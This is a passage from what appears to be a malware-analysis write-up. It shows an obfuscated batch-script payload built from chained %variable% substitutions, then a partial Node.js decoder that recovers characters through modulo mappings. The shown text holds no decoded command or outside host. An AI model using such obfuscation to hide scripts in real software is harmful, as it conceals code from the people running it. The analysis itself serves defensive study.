z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>dc<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>u<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ma<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>g<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>u<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>v<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>dc<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qg<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ba<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ec<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>hv<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cu<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>u<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>xk<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ul<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>o<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>nv<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ax<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>g<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>wa<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>h<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qf<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>gm<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ec<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ul<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>eb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>ds<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qf<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>wa<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>wa<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>t<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>qg<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>u<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>pv<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>rb<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cr<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>nv<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span><span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>cr<span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>%o ...
</span></code></pre><p>After arranging the whole thing with <code>---START---</code> and <code>---END---</code> delimiters, we can start decoding !<pre class="language-js z-code" data-lang=js><code class=language-js data-lang=js><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">fs</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-function z-ts">require</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>fs<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">MAPPING_REGEX</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span><span class="z-string z-regexp z-ts"> <span class="z-punctuation z-definition z-string z-begin z-ts">/</span>%x%%s%%p%%ma%%s%<span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">.</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span>%zz%<span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">\d</span><span class="z-keyword z-operator z-quantifier z-regexp">+</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span> %% <span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">\d</span><span class="z-keyword z-operator z-quantifier z-regexp">+</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span><span class="z-constant z-other z-character-class z-regexp">\n</span><span class="z-constant z-other z-character-class z-regexp">.</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span><span class="z-constant z-other z-character-class z-regexp">\n</span>%x%%s%<span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-regexp">.</span><span class="z-keyword z-operator z-quantifier z-regexp">*</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span>%zz%%=exitcodeAscii%<span class="z-punctuation z-definition z-string z-end z-ts">/</span><span class="z-keyword z-other z-ts">g</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">file</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-support z-variable z-object z-process z-ts">process</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-process z-ts">argv</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-constant z-numeric z-decimal z-ts">2</span><span class="z-meta z-brace z-square z-ts">]</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">data</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">fs</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">readFileSync</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">file</span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>utf16le<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">matches</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">data</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">matchAll</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-constant z-ts">MAPPING_REGEX</span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Manual mappings defined at part 1. (needed for "/a cmd exit")</span>
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">mappings</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">ma</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>a<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">gm</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>c<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">qf</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>m<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">h</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>d<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">ax</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>e<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">ds</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>x<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">rb</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>i<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">cu</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>t<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts">	<span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">qd</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span> <span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Parse mappings from part 2.</span>
</span><span class="z-source z-ts"><span class="z-keyword z-control z-loop z-ts">for</span> <span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">match</span></span> </span></span><span class="z-keyword z-operator z-expression z-of z-ts">of</span> <span class="z-variable z-other z-readwrite z-ts">matches</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-array-binding-pattern-variable z-ts"><span class="z-punctuation z-definition z-binding-pattern z-array z-ts">[</span><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">_</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">_</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">dividend</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">divisor</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">variable</span></span><span class="z-punctuation z-definition z-binding-pattern z-array z-ts">]</span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-readwrite z-ts">match</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">result</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-function z-ts">parseInt</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">dividend</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-keyword z-operator z-arithmetic z-ts">%</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-function z-ts">parseInt</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">divisor</span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">char</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-class z-builtin z-ts">String</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">fromCharCode</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">result</span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-meta z-function-call z-ts"><span class="z-support z-class z-console z-ts">console</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-console z-ts">log</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-template z-ts"><span class="z-punctuation z-definition z-string z-template z-begin z-ts">`</span><span class="z-meta z-template z-expression z-ts"><span class="z-punctuation z-definition z-template-expression z-begin z-ts">${</span></span><span class="z-meta z-template z-expression z-ts"><span class="z-meta z-embedded z-line z-ts"><span class="z-variable z-other z-readwrite z-ts">variable</span></span><span class="z-punctuation z-definition z-template-expression z-end z-ts">}</span></span> => <span class="z-meta z-template z-expression z-ts"><span class="z-punctuation z-definition z-template-expression z-begin z-ts">${</span></span><span class="z-meta z-template z-expression z-ts"><span class="z-meta z-embedded z-line z-ts"><span class="z-variable z-other z-readwrite z-ts">char</span></span><span class="z-punctuation z-definition z-template-expression z-end z-ts">}</span></span><span class="z-punctuation z-definition z-string z-template z-end z-ts">`</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-variable z-other z-readwrite z-ts">mappings</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-variable z-other z-readwrite z-ts">variable</span><span class="z-meta z-brace z-square z-ts">]</span></span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-readwrite z-ts">char</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Retrieve the payload part</span>
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">to_decode</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">data</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">split</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>---START---<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-constant z-numeric z-decimal z-ts">1</span><span class="z-meta z-brace z-square z-ts">]</span></span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">split</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>---END---<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-constant z-numeric z-decimal z-ts">0</span><span class="z-meta z-brace z-square z-ts">]</span></span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">split</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span><span class="z-constant z-character z-escape z-ts">\n</span><span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">let</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">res</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span><span class="z-punctuation z-definition z-string z-end z-ts">"</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-keyword z-control z-loop z-ts">for</span> <span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">let</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">line</span></span> </span></span><span class="z-keyword z-operator z-expression z-of z-ts">of</span> <span class="z-variable z-other z-readwrite z-ts">to_decode</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
